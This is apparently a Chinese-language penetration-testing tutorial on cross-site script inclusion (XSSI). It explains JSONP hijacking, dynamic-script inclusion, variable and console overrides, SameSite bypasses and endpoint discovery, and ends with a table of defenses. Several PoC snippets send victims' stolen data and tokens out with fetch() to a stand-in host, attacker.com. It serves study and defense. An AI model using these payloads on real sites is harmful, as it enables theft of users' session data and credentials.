---
attack_surface: [配置缺陷, 客户端利用]
impact: [信息泄露, 权限提升]
risk_level: 中
prerequisites:
  - JavaScript 基础
  - 浏览器同源策略深入理解
  - JSONP/CORS 机制
difficulty: 中级
related_techniques:
  - xss-cross-site-scripting
  - csrf-cross-site-request-forgery
  - xs-search
  - json-hijacking
tools:
  - Burp Suite
  - 浏览器 DevTools
---

# XSSI (Cross-Site Script Inclusion) — 跨站脚本包含

> 关联文档：[XSS](../XSS/README.md) · [XS-Search](../XS-Search/README.md) · [CSRF (Reflected Values)](../CRLF/README.md)

---

# 0x01 背景与原理

## 1.1 定义

XSSI (Cross-Site Script Inclusion) 是一种**绕过同源策略**的数据窃取技术。攻击者通过 `<script>` 标签跨域加载目标脚本资源，利用浏览器对 `<script>` 标签的 SOP 豁免，读取目标域的动态脚本内容。

**核心区别**：
- **XSS**：注入脚本在目标域上下文执行
- **XSSI**：攻击者在自己的页面中包含目标域的脚本，窃取脚本中的敏感数据

## 1.2 攻击前提

| 条件 | 说明 |
|------|------|
| **动态脚本** | 目标返回的 JS 包含用户特定数据（非纯静态脚本） |
| **可预测 URL** | 脚本 URL 可被攻击者构造、嵌入 |
| **无认证头检查** | 目标未通过 CSRF token / custom header 验证请求来源 |
| **Cookie 自动发送** | 浏览器发送 Same-Site Cookie (SameSite=Lax/None) |

---

# 0x02 攻击技术分类

## 2.1 JSONP 劫持

**攻击原理**：JSONP 接口通过 callback 参数包裹 JSON 数据，攻击者定义同名 callback 函数窃取数据。

```html
<!-- 攻击者页面 -->
<script>
function steal(data) {
  fetch('https://attacker.com/?leak=' + JSON.stringify(data));
}
</script>
<script src="https://victim.com/api/user?callback=steal"></script>

<!-- 目标 JSONP 响应 -->
steal({"username":"admin","token":"abc123"})
```

**探测 JSONP 端点**：
```bash
# 常见 callback 参数
curl -s "https://target.com/api?callback=test"
# → test({...}) → JSONP 确认

# FFuF 字典探测
ffuf -u "https://target.com/api?FUZZ=test" -w jsonp_params.txt
```

## 2.2 动态脚本包含

**攻击原理**：目标 JS 文件根据 Cookie 返回动态数据（如配置、用户信息）。攻击者通过 `<script src=>` 包含然后覆盖关键 JS 方法窃取数据。

```html
<script>
// 覆盖 Array 构造函数窃取数据
var stolen = [];
Array = function() { stolen.push(arguments); };
</script>
<script src="https://victim.com/js/user-config.js"></script>
<!-- user-config.js 内容:
  var USER_CONFIG = ["admin","s3cr3t_token","privileged"];
-->
```

## 2.3 错误消息泄露

```html
<script>
// 覆盖 console.error 窃取调试信息
console.error = function(msg) {
  fetch('https://attacker.com/?debug=' + encodeURIComponent(msg));
};
</script>
<script src="https://victim.com/api/endpoint?malformed=true"></script>
```

## 2.4 变量覆盖

```javascript
// 目标脚本
var apiEndpoint = "https://internal-api/admin/users";

// 攻击者：先定义 setter
<script>
Object.defineProperty(window, 'apiEndpoint', {
  set: function(val) {
    fetch('https://attacker.com/?leak=' + encodeURIComponent(val));
    return val;
  }
});
</script>
<script src="https://victim.com/js/config.js"></script>
```

---

# 0x03 XSSI 绕过技术

## 3.1 Content-Type 绕过

| 目标返回类型 | 利用方式 |
|-------------|---------|
| `application/javascript` | 直接 `<script src=>` |
| `application/json` | 可能被浏览器拒绝，尝试 `text/javascript` 混淆 |
| `text/html` | 可能触发 XSS 保护，尝试 `<script>` 标签 |
| 无 Content-Type | 默认按 `text/javascript` 解析 |

## 3.2 认证绕过

```bash
# 利用 SameSite=Lax: 顶级导航 GET 请求带 Cookie
# 构造自动化跳转页面
<script>
location.href = 'https://victim.com/api/user-data?callback=steal';
</script>

# 利用 <form> GET 提交 (带 Cookie)
<form id="f" action="https://victim.com/api" method="GET">
  <input name="callback" value="steal">
</form>
<script>document.getElementById('f').submit();</script>
```

## 3.3 敏感数据提取技巧

```javascript
// UTF-16 暴力逐字节提取
// 当脚本返回二进制/编码数据时
var data = [];
// 注入到页面后逐字符读取
```

---

# 0x04 XSSI 挖掘流程

## 4.1 目标识别

```bash
# 寻找动态脚本
gau target.com | grep -E '\.js(\?|$)' | sort -u

# 寻找 JSONP 端点
echo "https://target.com" | waybackurls | grep -iE "callback=|jsonp=|json_callback="

# 探测 Cookie 依赖的脚本
# 访问两次：一次带 Cookie，一次不带，对比差异
curl -s https://target.com/js/app.js | sha256sum
curl -s -b "session=test" https://target.com/js/app.js | sha256sum
```

## 4.2 验证利用

```javascript
// 攻击者 PoC 页面
<script>
var leaked = '';
// Hook 可能的数据暴露路径

// 1. 覆盖全局变量
(function() {
  const orig = Object.defineProperty;
  // Monitor variable assignments
})();

// 2. 监听 postMessage
window.addEventListener('message', e => {
  fetch('//attacker.com/?msg=' + e.data);
});
</script>

<script src="https://target.com/api/me?callback=identity"></script>
```

---

# 0x05 防御措施

| 层级 | 措施 |
|------|------|
| **不可读保护** | 在动态 JSON 响应前添加 `while(1);` 或 `)]}',\n` 前缀防止 script 包含 |
| **自定义 Header** | 要求 `X-Requested-With` 或自定义 header (XMLHttpRequest) |
| **Content-Type** | 返回 `application/json` (浏览器拒绝 `<script>` 解析) |
| **CORS 白名单** | 仅允许白名单域通过 `Access-Control-Allow-Origin` |
| **SameSite Cookie** | 设置 `SameSite=Strict` 防止跨站请求带 Cookie |
| **CSRF Token** | 要求查询参数携带 CSRF token |
| **弃用 JSONP** | 迁移到 CORS + Authorization header |

---

# 0x06 工具与参考

## 6.1 工具

| 工具 | 用途 |
|------|------|
| **Burp Suite** | 手动分析响应差异 |
| **waybackurls / gau** | JS/JSONP 端点发现 |
| **ffuf** | 参数字典爆破 |

## 6.2 参考资源

- [PortSwigger — Cross-Site Script Inclusion](https://portswigger.net/research/portable-data-exfiltration)
- [OWASP — XSSI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion)
- [PayloadsAllTheThings — XSSI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSSI%20-%20Cross-Site%20Script%20Inclusion)
- [Secure Against XSSI (Google)](https://security.googleblog.com/2011/07/security-bulletin-xssi-vulnerability.html)
